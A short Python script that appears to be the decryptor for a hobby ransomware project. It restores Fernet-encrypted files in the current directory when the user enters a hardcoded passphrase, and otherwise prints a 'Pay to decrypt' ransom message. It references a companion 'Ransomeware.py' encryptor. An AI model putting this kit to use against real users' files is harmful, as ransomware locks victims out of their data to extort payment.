import os
from cryptography.fernet import Fernet

files = []

# Collect files to decrypt
for file in os.listdir():
    if file in ['Ransomeware.py', 'seckey.key', 'decrypt.py']:
        continue
    if os.path.isfile(file):
        files.append(file)

# Read the secret key
with open("seckey.key", "rb") as k:
    secret_key = k.read()

# Secret code verification
secret_phrase = "Radhika"
user_entry = input("Enter the secret code to decrypt your files: ")

if user_entry == secret_phrase:
    for file in files:
        with open(file, 'rb') as theFile:
            content = theFile.read()
        decrypted_content = Fernet(secret_key).decrypt(content)
        with open(file, 'wb') as theFile:
            theFile.write(decrypted_content)
    print("✅ Great! Your files have been decrypted.")
else:
    print("❌ Incorrect code. Pay to decrypt your files! 😈")
